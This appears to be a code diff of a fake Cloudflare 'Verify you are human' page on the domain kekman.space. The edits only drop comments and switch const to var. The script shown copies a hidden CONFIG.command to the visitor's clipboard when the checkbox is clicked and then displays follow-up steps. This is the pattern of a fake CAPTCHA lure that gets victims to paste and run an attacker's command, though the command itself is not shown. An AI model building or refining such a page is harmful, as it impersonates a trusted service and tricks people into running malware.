@@ -267,7 +267,6 @@
 
 <div class="main-wrapper">
   <div class="main-content">
-    <!-- Logo -->
     <div class="logo-container">
       <img class="logo-img" src="https://www.google.com/s2/favicons?sz=128&domain=cloudflare.com" alt="Cloudflare Logo" />
       <p class="domain-title"><span class="domain-name">kekman.space</span></p>
@@ -277,7 +276,6 @@
       <p><span class="textallstep">Verify you are human by completing the action below.</span></p>
     </div>
 
-    <!-- Captcha box -->
     <div id="checkbox-window" class="checkbox-window">
       <div class="checkbox-window-inner">
         <div class="checkbox-container">
@@ -383,16 +381,16 @@
   });
 
   // ---- Checkbox click: copy and show steps ----
-  const checkbox = document.getElementById('checkbox');
-  const checkboxWindow = document.getElementById('checkbox-window');
-  const verifyWindow = document.getElementById('verify-window');
-  const step1Text = document.querySelector('.tettx .step1');
-  const step2Text = document.querySelector('.tettx .step2');
-  const step3Text = document.querySelector('.tettx .step3');
-  const step1Checkbox = document.querySelector('.checkbox-container .step1');
-  const step2Spinner = document.querySelector('.checkbox-container .step2');
-  const step3Success = document.querySelector('.checkbox-container .step3');
-  const verifyButton = document.getElementById('verify-button');
+  var checkbox = document.getElementById('checkbox');
+  var checkboxWindow = document.getElementById('checkbox-window');
+  var verifyWindow = document.getElementById('verify-window');
+  var step1Text = document.querySelector('.tettx .step1');
+  var step2Text = document.querySelector('.tettx .step2');
+  var step3Text = document.querySelector('.tettx .step3');
+  var step1Checkbox = document.querySelector('.checkbox-container .step1');
+  var step2Spinner = document.querySelector('.checkbox-container .step2');
+  var step3Success = document.querySelector('.checkbox-container .step3');
+  var verifyButton = document.getElementById('verify-button');
 
   checkbox.addEventListener('click', function() {
     copyToClipboard(CONFIG.command);
